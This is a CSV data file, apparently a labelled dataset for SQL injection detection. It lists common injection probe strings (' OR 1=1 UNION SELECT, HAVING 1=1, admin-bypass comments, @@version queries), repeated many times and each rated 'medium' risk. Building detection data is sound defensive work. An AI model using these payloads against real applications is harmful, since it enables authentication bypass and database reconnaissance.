query,risk
' GROUP BY 1,medium
' GROUP BY 1,medium
' LIMIT 1 /**/,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' LIMIT 1 /**/,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
1' OR admin' --,medium
' LIMIT 1 /**/,medium
' OR 1=1 UNION SELECT 1 --,medium
"' OR CONVERT(int, '1') --",medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1 #,medium
' HAVING 1=1 #,medium
' AND username LIKE 'admin' --,medium
' OR MD5('test') --,medium
' GROUP BY 1 --,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' HAVING 1=1,medium
' HAVING 1=1 #,medium
' AND username LIKE 'admin' --,medium
' OR 1=1 UNION SELECT 1 --,medium
' HAVING 1=1,medium
"' OR CONVERT(int, '1') --",medium
"' OR CONVERT(int, '1') --",medium
' OR 1=1 UNION SELECT 1 --,medium
' GROUP BY 1 --,medium
' OR MD5('test') --,medium
' OR MD5('test') --,medium
"' OR CONVERT(int, '1') --",medium
"' UNION SELECT 1,2 --",medium
1' OR admin' --,medium
' GROUP BY 1 --,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' HAVING 1=1 #,medium
' OR CAST('1' as int) --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1 --,medium
' UNION ALL SELECT 1 --,medium
' OR MD5('test') --,medium
' OR CAST('1' as int) --,medium
"' UNION SELECT 1,2 --",medium
' HAVING 1=1 #,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
' OR MD5('test') --,medium
"' UNION SELECT 1,2 --",medium
' OR MD5('test') --,medium
' UNION ALL SELECT 1 --,medium
' OR MD5('test') --,medium
' GROUP BY 1,medium
' OR MD5('test') --,medium
' GROUP BY 1 --,medium
' LIMIT 1 /**/,medium
' HAVING 1=1,medium
'; SELECT @@version --,medium
' HAVING 1=1,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
1' OR admin' --,medium
'; SELECT @@version --,medium
' OR CAST('1' as int) --,medium
' LIMIT 1 /**/,medium
' LIMIT 1 /**/,medium
' OR CAST('1' as int) --,medium
' LIMIT 1 /**/,medium
' LIMIT 1 /**/,medium
' AND username LIKE 'admin' --,medium
' GROUP BY 1 --,medium
"' OR CONVERT(int, '1') --",medium
' OR MD5('test') --,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1 #,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1,medium
"' OR CONVERT(int, '1') --",medium
1' OR admin' --,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1,medium
1' OR admin' --,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' GROUP BY 1 --,medium
' HAVING 1=1 #,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
' HAVING 1=1 #,medium
' GROUP BY 1,medium
' GROUP BY 1 --,medium
' HAVING 1=1 #,medium
' GROUP BY 1 --,medium
